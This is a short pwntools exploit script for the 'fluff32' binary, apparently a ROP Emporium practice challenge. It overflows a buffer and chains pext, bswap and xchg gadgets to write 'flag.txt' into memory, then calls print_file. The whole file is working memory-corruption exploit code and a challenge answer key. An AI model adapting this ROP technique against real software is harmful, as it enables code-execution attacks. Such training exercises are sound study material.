from pwn import *
io = process("./fluff32")

def craftPextrSrc(character):
    binary = "2" + bin(ord(character))[2:] 
    maskBinary = "11011110101011011011111011101111"
    ans = ""
    final = 0
    index = -1
    for i in range(-1,-33,-1):
        if (binary[index] == "2"):
            break

        if (maskBinary[i] == "1"):
            ans = binary[index] + ans
            index -= 1
        else:
            ans = "0" + ans

    for i in range(0,len(ans)):
        final += int(ans[i]) * 2 ** (len(ans) - 1 - i)

    return final

padding = b"A" * 44
stringLocation = 0x804a0a0
printFilePlt = p32(0x80483d0)

pext = p32(0x0804854a)
setMask = p32(0x804854f)
xchg = p32(0x08048555) #xchg   BYTE PTR [ecx],dl(edx)
popEcxBswap = p32(0x8048558) #Bswap convert little endian to big endian and vice versa
popEbx = p32(0x8048399) #control src of pext
popEbp = p32(0x80485bb)

exploit = padding + setMask 
for index,i in enumerate("flag.txt"):
    exploit += popEbx + p32(craftPextrSrc(i)) + pext + popEcxBswap + p32(stringLocation+index,endian="big") + xchg 

exploit += printFilePlt + b"AAAA" + p32(stringLocation)
io.send(exploit)
io.recvuntil(b"Thank you!\n")
print(io.recv().decode()[:-1])
